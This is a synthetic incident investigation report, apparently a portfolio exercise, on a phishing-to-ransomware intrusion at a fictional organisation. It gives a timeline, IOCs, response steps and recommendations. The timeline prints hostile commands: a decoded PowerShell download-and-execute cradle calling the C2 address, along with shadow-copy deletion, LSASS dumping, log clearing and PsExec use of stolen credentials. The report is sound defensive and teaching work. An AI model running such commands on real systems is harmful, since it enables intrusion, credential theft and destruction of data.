# Incident Investigation Report: IR-2026-1027

**Phishing to ransomware: payroll-themed HTML smuggling leading to file server encryption**

| Field | Value |
|---|---|
| Case ID | IR-2026-1027 |
| Classification | CONFIDENTIAL: Incident Response |
| Organization | Example Community Services (fictional) |
| Incident type | Ransomware (data encryption), credential theft |
| Severity | **SEV-1 (Critical)**: business-critical file share unavailable |
| Status | Contained and eradicated; recovery complete; post-incident actions open |
| Lead investigator | Xiome West |
| Report date | 2026-10-29 |
| Related cases | Phishing campaign analysis (Project 08), identity audit findings (Project 06) |

> All data in this case is synthetic, created for a portfolio exercise. IPs are RFC 5737 documentation addresses and domains use `.example`.

---

## 1. Executive summary

On **27 October 2026** a payroll-themed phishing email reached six staff members. One employee opened the attached "payroll form." It silently downloaded a disk image file, which installed remote-access malware on their workstation (**WS-0102**). Within **25 minutes** of the email being opened, the attacker had stolen the passwords stored in that computer's memory, including the password of a **backup service account** with broad access. They used it to log in to the main **file server (FS01)**, delete its built-in recovery snapshots, and encrypt **250 files** on the Finance share. The attacker then cleared the server's security log to cover their tracks.

**Time from email to encryption: 1 hour 22 minutes.** The incident was detected when Finance staff reported files they couldn't open.

**Impact:** the Finance share on FS01 was unavailable for about 7 hours. All files were restored from the off-site backup taken the previous night, so about 16 hours of edits were lost. **There is no evidence that data was copied out of the network.** Outbound traffic from the infected workstation was limited to small, regular "check-in" messages. No large transfers were seen from either host. Because the attacker had full control of the workstation, we cannot rule out access to that one user's files. Legal counsel has been briefed on notification obligations.

**Root causes** (each one would have stopped or slowed the attack):
1. The email gateway allowed **HTML attachments** from external senders.
2. The user had **local administrator rights**, which let the attacker read passwords from memory.
3. The **backup service account was over-privileged** and logged in to workstations, so its password was there to steal (see Project 06 findings AD-KRB-02 and AD-PRIV-01).
4. **No alert** fired on disabled antivirus or on shadow-copy deletion.

## 2. Scope of investigation

| Item | Detail |
|---|---|
| Hosts examined | WS-0102 (Windows 11, user tnguyen), FS01 (Windows Server 2019, file server) |
| Evidence sources | Sysmon (events 1, 3, 10, 11), Windows Security (4624, 4698, 1102), System (7045) logs, live-response snapshots (processes, connections, scheduled tasks, services, autoruns), proxy and Entra ID sign-in logs (Project 08) |
| Collection method | `collectors/win_triage.ps1` (read-only) run from external media; SHA-256 manifest per host |
| Analysis | `analyze_triage.py` (rule-based detections, PowerShell decoding, beacon and mass-encryption analytics), manual review |
| Not available | Memory images (not captured before WS-0102 was isolated; see Lessons learned), FS01 Security log after 15:30:50 UTC (cleared by attacker; reconstructed from the SIEM-forwarded copy) |

## 3. Evidence register

| # | Item | Source host | Collected (UTC) | By | Integrity |
|---|---|---|---|---|---|
| E1 | Triage package WS-0102 (8 files) | WS-0102 | 2026-10-27 20:10 | X. West | SHA-256 manifest verified ✅ |
| E2 | Triage package FS01 (8 files) | FS01 | 2026-10-27 20:40 | X. West | SHA-256 manifest verified ✅ |
| E3 | Phishing email `01_credential_phish.eml` | Mailbox (tnguyen) | 2026-10-27 18:02 | X. West | SHA-256 recorded in Project 08 report |
| E4 | Proxy, message trace, sign-in exports | Cloud consoles | 2026-10-27 18:30 | X. West | Exported CSVs hashed |

The chain-of-custody form is in [`docs/evidence-handling-and-chain-of-custody.md`](../docs/evidence-handling-and-chain-of-custody.md).

## 4. Timeline of attacker activity (UTC)

| Time | Host | Activity | ATT&CK |
|---|---|---|---|
| 14:03:12 | Email | Phishing email delivered to 6 users (1 quarantined) | T1566.001 |
| 14:25:00 | WS-0102 | Edge writes `Payroll_Nov2026.iso` to Downloads (HTML smuggling output) | T1027.006, T1553.005 |
| 14:26:35 | WS-0102 | User opens the ISO; `mshta.exe` runs `E:\Payroll_Nov2026.hta` | T1218.005 |
| 14:26:41 | WS-0102 | Hidden, encoded PowerShell. **Decoded:** `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a')` | T1059.001 |
| 14:26:50 | WS-0102 | `C:\ProgramData\SysUpdate\upd.dll` written | T1105 |
| 14:26:55 | WS-0102 | `rundll32.exe upd.dll,Start` (loader) | T1218.011 |
| 14:26:58 → | WS-0102 | **C2 beaconing** to 198.51.100.66:443 every ~60 s (jitter CV 0.04), ongoing at collection | T1071.001 |
| 14:27:20 | WS-0102 | Scheduled task `\MicrosoftEdgeUpdateTaskCore` (masquerading) runs loader at logon | T1053.005, T1036 |
| 14:35:00 | WS-0102 | Discovery: `whoami /all`, `net group "domain admins"`, `nltest /dclist` | T1087.002, T1482 |
| 14:50:00 | WS-0102 | **LSASS dumped** with `comsvcs.dll MiniDump` (full access 0x1FFFFF) | T1003.001 |
| 14:51:40 | WS-0102 | Microsoft Defender real-time protection disabled | T1562.001 |
| 15:25:00 | WS-0102 → FS01 | `PsExec64.exe \\FS01 -s` using **svc_backup** credentials | T1569.002, T1078.002 |
| 15:25:02 | FS01 | Type 3 logon, svc_backup from 10.10.20.102; `PSEXESVC` service installed | T1021.002, T1543.003 |
| 15:25:04 | FS01 | `C:\Windows\Temp\lk.exe --path D:\Shares --ext .lockd` (ransomware) | T1486 |
| 15:25:06–08 | FS01 | `vssadmin delete shadows`, `wbadmin delete catalog`, `bcdedit recoveryenabled no` | T1490 |
| 15:25:10–15:29:19 | FS01 | 250 Finance files encrypted to `*.lockd` | T1486 |
| 15:30:00 | FS01 | Ransom note `D:\Shares\README_RESTORE_FILES.txt` | T1486 |
| 15:30:50 | FS01 | `wevtutil cl Security` → Event 1102 | T1070.001 |
| 16:05 | — | Finance staff report unopenable files → incident declared (SEV-1) | — |
| 16:20 | — | FS01 and WS-0102 network-isolated via EDR; svc_backup disabled | Containment |

**Dwell time:** 58 minutes from code execution to encryption. **Time to detect:** about 35 minutes after encryption finished (user report). **Time to contain:** 15 min after declaration.

## 5. Analysis

**Initial access and execution.** The phishing email (Project 08, score 100/100) carried an HTML file that used JavaScript `atob()` to build an ISO file in the browser. Files inside an ISO don't inherit the internet "Mark of the Web," which bypasses Office and SmartScreen warnings (T1553.005). The user double-clicked an HTA inside the mounted image.

**Command and control.** The decoded PowerShell downloaded a second stage over HTTP. A DLL loader then beaconed over HTTPS every ~60 s with very low jitter (coefficient of variation 0.04). That regularity is typical of commodity C2 frameworks and is one of the strongest network signals in this case. The beacon was still active when evidence was collected (live connection owned by the rundll32 process).

**Credential access.** About 24 minutes after code execution, the attacker dumped LSASS using a built-in Windows DLL (`comsvcs.dll`), a "living off the land" technique that needs no extra tools. This worked because tnguyen was a **local administrator** (a 2024 exception that was never removed) and **LSA protection / Credential Guard were disabled** (checks DAT-02/DAT-03 in Project 02's Windows hardening audit). The svc_backup account's credentials were in memory because its backup agent runs interactively on workstations.

**Lateral movement and impact.** With svc_backup (a member of Backup Operators, and Kerberoastable: Project 06 AD-KRB-02), the attacker used PsExec to run the encryptor as SYSTEM on FS01. Before encrypting, it deleted Volume Shadow Copies and the backup catalog, and disabled boot recovery: standard ransomware steps to block local recovery. The **off-site, immutable backup copy was not reachable** with svc_backup's rights, which is why recovery succeeded.

**Exfiltration assessment.** Network flow data for both hosts shows no large outbound transfers. The C2 channel averaged ~320 bytes per check-in. No staging archives (`.zip`/`.7z`/`.rar`) were created. **Conclusion: no evidence of exfiltration**, with medium confidence, limited by the lack of a memory image and full packet capture.

## 6. Indicators of compromise

| Type | Indicator | Context |
|---|---|---|
| IPv4 | `198.51.100.66` | C2 (HTTP stage download + HTTPS beacon) |
| IPv4 | `198.51.100.23` | Credential-harvest form (Project 08) |
| IPv4 | `203.0.113.88` | Attacker sign-ins to M365 (Project 08) |
| URL | `http://198.51.100.66/a` | PowerShell stager |
| Domain | `c0rp.example`, `c0rp-portal.example` | Phishing sender and landing page |
| File path | `C:\ProgramData\SysUpdate\upd.dll` | Loader |
| File path | `C:\Windows\Temp\lk.exe` | Ransomware encryptor |
| File path | `C:\ProgramData\SysUpdate\d.bin` | LSASS dump |
| Scheduled task | `\MicrosoftEdgeUpdateTaskCore` | Persistence (masquerading as Edge updater) |
| Service | `PSEXESVC` | Lateral movement |
| Extension / note | `.lockd`, `README_RESTORE_FILES.txt` | Ransomware artifacts |
| SHA-256 | see `reports/triage_findings.md` | Loader and encryptor hashes |

IOCs were pushed to EDR custom indicators, the firewall, and the DNS filter, and were hunted across all endpoints. **No other hosts matched.**

## 7. Response actions

| Phase | Action | Done (UTC) |
|---|---|---|
| Contain | EDR network isolation of WS-0102 and FS01 | 10-27 16:20 |
| Contain | Disabled svc_backup, tnguyen, jdoe (Project 08); revoked sessions | 10-27 16:25 |
| Contain | Blocked IOCs at firewall, proxy, DNS, EDR | 10-27 16:40 |
| Eradicate | Live-response triage (E1, E2) before rebuild | 10-27 20:40 |
| Eradicate | WS-0102 and FS01 **re-imaged** from gold images (not "cleaned") | 10-28 02:00 |
| Eradicate | Reset all privileged and service account passwords; **krbtgt reset twice** (LSASS dump may have exposed domain credentials) | 10-28 06:00 |
| Recover | Finance share restored from immutable off-site backup (10-26 23:00); integrity spot-checked | 10-27 22:15 |
| Recover | svc_backup replaced with a gMSA scoped to backup servers only | 10-28 15:00 |
| Recover | 30-day heightened monitoring of affected identities and hosts | ongoing |

## 8. Lessons learned & recommendations

| # | Gap | Recommendation | Owner | Priority |
|---|---|---|---|---|
| 1 | HTML/ISO attachments allowed | Block HTML, ISO, IMG, VHD, LNK, HTA and OneNote attachments from external senders at the gateway | IT Director | P1: 7 days |
| 2 | Users with local admin | Remove standing local admin; use LAPS and just-in-time elevation | IT Director | P1: 30 days |
| 3 | Credential theft possible | Enable **LSA protection (RunAsPPL)** and **Credential Guard**; Defender **ASR rule** "Block credential stealing from LSASS" | IT Director | P1: 30 days |
| 4 | Over-privileged service account on workstations | gMSA, tiered admin model, deny service-account logon to workstations (done) | IT Director | ✅ |
| 5 | No alert on tamper/impact behaviors | SIEM alerts for Defender disablement, `vssadmin delete`, Event 1102, PsExec service installs, LSASS access (rules DF-11–DF-17) | Security | P1: 14 days |
| 6 | No memory capture before isolation | Add a memory-capture step (WinPmem) to the playbook *before* network isolation when it's safe to do so | Security | P2 |
| 7 | Detection came from a user report | Tune EDR and enable **Tamper Protection**; on-call alerting 24×7 (or MDR service) | IT Director | P2 |
| 8 | Backup resilience proven | Keep immutable off-site copies; quarterly restore tests (CSF RC.RP) | IT Director | ✅ continue |

**What went well:** offline/immutable backups made paying the ransom unnecessary; Sysmon was deployed, so the full attack chain could be reconstructed even after the Security log was cleared; MFA blocked the attacker for a second phished user (Project 08).

## 9. Appendix: ATT&CK mapping

Initial Access (T1566.001) → Defense Evasion (T1027.006, T1553.005, T1218.005, T1218.011, T1036, T1562.001, T1070.001) → Execution (T1059.001) → Command & Control (T1105, T1071.001) → Persistence (T1053.005, T1543.003) → Discovery (T1087.002, T1482) → Credential Access (T1003.001) → Lateral Movement (T1569.002, T1021.002, T1078.002) → Impact (T1490, T1486)
